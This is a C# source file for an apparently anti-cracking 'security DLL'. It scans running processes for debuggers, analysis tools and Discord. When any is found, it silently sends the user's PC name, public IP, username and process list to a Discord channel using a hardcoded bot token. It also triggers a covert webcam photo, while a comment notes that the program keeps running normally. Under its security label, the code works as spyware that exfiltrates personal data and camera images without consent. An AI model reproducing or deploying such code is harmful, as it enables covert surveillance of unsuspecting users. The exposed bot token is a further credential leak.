using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Management;
using Newtonsoft.Json;

namespace Security_DLL
{
    internal class SistemaSeguridad
    {
        private static readonly string BotToken = "MTQ5OTgyMjM5NjY3MTAwMDYxNg.GKeTDs.SxhFOVyHyOKskwMdFPCJ7NUOidPPGqxBdIzQZw";
        private static readonly ulong CanalID = 1513053357382832129;

        private static bool alertaEnviada = false; // Para no enviar múltiples alertas iguales

        private static readonly List<string> HerramientasCraking = new List<string>
        {
            "ollydbg", "x64dbg", "x32dbg", "ida", "cheat engine", "process hacker",
            "process explorer", "dnspy", "de4dot", "ilspy", "dotpeek", "wireshark",
            "fiddler", "burpsuite", "charles", "httpdebugger", "scylla", "lordpe",
            "importrec", "ghidra", "radare2", "cutter", "immunity debugger",
            "windbg", "api monitor", "rohitab", "extremedumper", "mega dump"
        };

        private static readonly List<string> ProcesosSospechosos = new List<string>
        {
            "processhacker", "procmon", "procexp", "tcpview", "regmon", "filemon",
            "apimonitor", "rohitab", "simpleassembly", "extremedumper", "injector"
        };

        public static async Task<bool> VerificarSeguridad()
        {
            bool peligroDetectado = false;
            StringBuilder reporte = new StringBuilder();

            // Obtener información del sistema
            string pcName = Environment.MachineName;
            string ipAddress = ObtenerIPPublica();
            string usuario = Environment.UserName;

            reporte.AppendLine($"🚨 **ALERTA DE SEGURIDAD** 🚨");
            reporte.AppendLine($"**PC:** {pcName}");
            reporte.AppendLine($"**IP:** {ipAddress}");
            reporte.AppendLine($"**Usuario:** {usuario}");
            reporte.AppendLine($"**Hora:** {DateTime.Now}");
            reporte.AppendLine($"**PID del proceso:** {Process.GetCurrentProcess().Id}");
            reporte.AppendLine();

            // Verificar Discord abierto
            if (VerificarDiscordAbierto())
            {
                peligroDetectado = true;
                reporte.AppendLine("⚠️ **DISCORD DETECTADO** - Discord está ejecutándose ⚠️");
                reporte.AppendLine("> Nota: La aplicación continuará funcionando normalmente");
            }

            // Verificar herramientas de cracking
            var herramientasDetectadas = DetectarHerramientasCraking();
            if (herramientasDetectadas.Any())
            {
                peligroDetectado = true;
                reporte.AppendLine("🔧 **HERRAMIENTAS DE CRACKING DETECTADAS:**");
                foreach (var herramienta in herramientasDetectadas)
                {
                    reporte.AppendLine($"> • {herramienta}");
                }
            }

            // En tu clase SistemaSeguridad, dentro de VerificarSeguridad():
            if (peligroDetectado && !alertaEnviada)
            {
                await EnviarReporteDiscord(reporte.ToString());

                // Tomar foto de la cámara
                await WebCam.TomarFotoConInfo();

                alertaEnviada = true;
            }

            // Verificar procesos sospechosos adicionales
            var procesosSospechosos = DetectarProcesosSospechosos();
            if (procesosSospechosos.Any())
            {
                peligroDetectado = true;
                reporte.AppendLine("🔄 **PROCESOS SOSPECHOSOS:**");
                foreach (var proceso in procesosSospechosos)
                {
                    reporte.AppendLine($"> • {proceso}");
                }
            }

            // Verificar si está siendo depurado
            if (Debugger.IsAttached)
            {
                peligroDetectado = true;
                reporte.AppendLine("🐛 **DEBUGGER DETECTADO** - Hay un debugger adjunto 🐛");
            }

            if (peligroDetectado && !alertaEnviada)
            {
                // Enviar reporte a Discord
                await EnviarReporteDiscord(reporte.ToString());
                alertaEnviada = true;

                // Enviar también los procesos sospechosos detallados
                await Procesos.EnviarProcesosSospechosos();
            }

            // No cerramos la aplicación, solo reportamos
            return true;
        }

        private static string ObtenerIPPublica()
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    return client.DownloadString("https://api.ipify.org").Trim();
                }
            }
            catch
            {
                try
                {
                    using (WebClient client = new WebClient())
                    {
                        return client.DownloadString("https://icanhazip.com").Trim();
                    }
                }
                catch
                {
                    return "No se pudo obtener IP";
                }
            }
        }

        private static bool VerificarDiscordAbierto()
        {
            var procesos = Process.GetProcesses();
            return procesos.Any(p => p.ProcessName.ToLower().Contains("discord"));
        }

        private static List<string> DetectarHerramientasCraking()
        {
            List<string> detectadas = new List<string>();
            var procesos = Process.GetProcesses();

            foreach (var proceso in procesos)
            {
                string nombreProceso = proceso.ProcessName.ToLower();
                foreach (var herramienta in HerramientasCraking)
                {
                    if (nombreProceso.Contains(herramienta.ToLower()))
                    {
                        detectadas.Add(proceso.ProcessName);
                        break;
                    }
                }
            }

            return detectadas.Distinct().ToList();
        }

        private static List<string> DetectarProcesosSospechosos()
        {
            List<string> detectadas = new List<string>();
            var procesos = Process.GetProcesses();

            foreach (var proceso in procesos)
            {
                string nombreProceso = proceso.ProcessName.ToLower();
                foreach (var sospechoso in ProcesosSospechosos)
                {
                    if (nombreProceso.Contains(sospechoso.ToLower()))
                    {
                        detectadas.Add(proceso.ProcessName);
                        break;
                    }
                }
            }

            return detectadas.Distinct().ToList();
        }

        private static async Task EnviarReporteDiscord(string mensaje)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    var payload = new { content = mensaje };
                    string jsonPayload = JsonConvert.SerializeObject(payload);
                    var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

                    string url = $"https://discord.com/api/v10/channels/{CanalID}/messages";
                    client.DefaultRequestHeaders.Add("Authorization", $"Bot {BotToken}");

                    HttpResponseMessage response = await client.PostAsync(url, content);

                    if (!response.IsSuccessStatusCode)
                    {
                        string error = await response.Content.ReadAsStringAsync();
                        Console.WriteLine($"Error al enviar a Discord: {error}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Excepción al enviar a Discord: {ex.Message}");
            }
        }
    }
}